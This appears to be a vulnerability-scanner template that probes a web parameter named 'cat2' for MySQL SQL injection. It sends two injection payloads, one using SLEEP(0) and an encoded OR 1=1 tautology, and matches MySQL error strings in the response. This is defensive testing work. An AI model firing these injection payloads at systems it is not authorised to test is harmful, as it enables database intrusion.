id: sqli6-mysql-19
name: 'SQLi mysql probe in cat2'
severity: high
type: active
tags:
  - sqli
  - injection
  - mysql
description: 'Triggers mysql error via cat2'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      cat2:
        - ''' AND SLEEP(0)--'
        - '''%0aOR%091=1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
